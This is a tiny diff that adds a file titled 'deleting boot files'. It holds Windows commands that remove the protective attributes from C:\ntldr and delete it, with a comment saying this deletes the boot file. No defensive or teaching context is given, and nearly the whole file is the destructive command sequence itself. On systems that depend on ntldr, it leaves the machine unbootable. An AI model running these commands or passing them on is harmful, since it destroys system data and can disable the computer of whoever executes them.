@@ -1,0 +1,7 @@
+deleting boot files
+
+attrib -S -R -H C:\ntldr
+
+del ntldr
+
+//this will delete the boot file ntldr
